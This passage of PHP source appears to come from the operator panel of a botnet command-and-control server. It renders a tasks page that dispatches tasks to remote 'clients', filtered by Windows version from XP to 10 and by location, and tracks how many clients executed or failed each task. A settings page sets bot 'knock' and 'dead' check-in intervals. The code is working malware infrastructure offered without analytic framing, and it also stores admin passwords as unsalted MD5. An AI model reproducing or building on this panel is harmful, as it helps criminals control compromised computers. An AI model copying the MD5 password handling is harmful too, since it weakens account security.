                    $Task["TasksSent"], $Task["ClientsExecuted"], $Task["ClientsFailed"], $Task["MaximumClients"],
                    GetSzDateTimeFromTimeStamp($Task["CreationDate"]),
                    GetSzDateTimeFromTimeStamp($Task["ExpirationDate"]),
                    $this->GetTaskStatusSz($Task["Status"]),
                    $TaskIdSz,
                    ////////////////////////////////////////////////////////////////////////////////
                    $TaskIdSz,
                    $TaskIdSz,
                    $SuspendResumeSz,
                    $TaskIdSz,
                    ////////////////////////////////////////////////////////////////////////////////
                    $TaskIdSz,
                    $Task["ClientsFilter"],
                    $Task["LocationsFilter"]
                    );
            
        }
        
        $TasksStatistics = $this->GdxGetTasksStatistics($Tasks);
        $TotalTasks = $TasksStatistics["TotalTasks"];
        $TasksExecuting = $TasksStatistics["TasksExecuting"];
        $TotalTasksSent = $TasksStatistics["TotalTasksSent"];
        $TotalTasksExecuted = $TasksStatistics["TotalTasksExecuted"];
        $TotalTasksFailed = $TasksStatistics["TotalTasksFailed"];
        
        $TasksTable = sprintf(GDX_TASKS_PAGE_TABLE_O, 
                $NewTaskResult,
                $TotalTasks, 
                $TasksExecuting,
                $TotalTasksSent, 
                $TotalTasksExecuted,
                $TotalTasksFailed
                );
        
        // 
        $ClientIDs = (isset($_GET["cid"])) ? $_GET["cid"] : "";
        $NewTask = sprintf(GDX_TASKS_PAGE_NEW_TASK, 
                $ClientIDs, 
                ALL_OPERATING_SYSTEMS_SZ, 
                WINDOWS_XP_SZ, 
                WINDOWS_2003_SZ, 
                WINDOWS_VISTA_SZ, 
                WINDOWS_7_SZ, 
                WINDOWS_8_SZ, 
                WINDOWS_8_1_SZ, 
                WINDOWS_10_SZ);
        
        $content = GDX_PAGE_HTML_O . GDX_PAGE_HEAD_O . GDX_PAGE_BODY_O . sprintf(GDX_TOP_NAVBAR, $this->Admin) . 
        GDX_PAGE_CONT_O . $TasksTable . $TasksInfo. GDX_TASKS_PAGE_TABLE_C . $NewTask . GDX_PAGE_CONT_C . 
        GDX_PAGE_BODY_C . GDX_PAGE_HTML_C;
        
        return $content;
    }
    
    private function GdxGetSettings()
    {
        if(isset($_SESSION["SETTINGS_RS"])) {
            $StResult = $_SESSION["SETTINGS_RS"];
            unset($_SESSION["SETTINGS_RS"]);
        } else $StResult = "";
        
        if(isset($_POST["Set"]))
        {
            $Saved = "";
            if(isset($_POST["Knock"]) && isset($_POST["Dead"]))
            {
                $UpPr = $this->Connection->prepare("UPDATE Settings SET KnockInterval = :Knock, DeadInterval = :Dead");
                $UpPr->execute(array("Knock" => $_POST["Knock"], "Dead" => $_POST["Dead"]));
                $Saved .= "Knock Interval, Dead Interval";
            }
            if( isset($_POST["currentpassword"]) && isset($_POST["newpassword1"]) && isset($_POST["newpassword2"]) &&
                strlen($_POST["currentpassword"]) && strlen($_POST["newpassword1"]) && strlen($_POST["newpassword2"]))
            {
                $CurrentHash = md5($_POST["currentpassword"]);
                $NewHash1 = md5($_POST["newpassword1"]);
                $NewHash2 = md5($_POST["newpassword2"]);
                if($NewHash1 == $NewHash2)
                {
                    $qAdmins = $this->Connection->query("SELECT * FROM Admins");
                    $fAdmins = $qAdmins->fetch(PDO::FETCH_ASSOC);
                    if($CurrentHash == $fAdmins["PasswordHash"])
                    {
                        $UpPw = $this->Connection->prepare("UPDATE Admins SET PasswordHash = :NewPw");
                        $UpPw->execute(array("NewPw" => $NewHash1));
                        $Saved .= ", New Password";
                    }
                }
            }
            
            $_SESSION["SETTINGS_RS"] = 
                "<div class='alert alert-success alert-dismissible' role='alert'>
                    <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
                        <span aria-hidden='true'>&times;</span>
                    </button>
                    Saved Successfully : {$Saved}
                </div>";
                
            header("Location: main.php?op=settings");
            exit;
        }
        
        $content = GDX_PAGE_HTML_O . GDX_PAGE_HEAD_O . GDX_PAGE_BODY_O . sprintf(GDX_TOP_NAVBAR, $this->Admin) . 
        GDX_PAGE_CONT_O . sprintf(GDX_SETTINGS_PAGE, $StResult, $this->KnockInterval, $this->DeadInterval) .
        GDX_PAGE_CONT_C . GDX_PAGE_BODY_C . GDX_PAGE_HTML_C;
        
        return $content;
    }
    
    public function GdxPage($option)
    {
        $content = "";
        
        switch($option)
        {
            case GDX_CLIENTS_OPT:
                $content = $this->GdxGetClients();
                break;
            case GDX_TASKS_OPT:
                $content = $this->GdxGetTasks();
                break;
            case GDX_SETTINGS_OPT:
                $content = $this->GdxGetSettings();
                break;
            default:
                $content = $this->GdxGetClients();
        }
        
        return $content;
    }
}
?>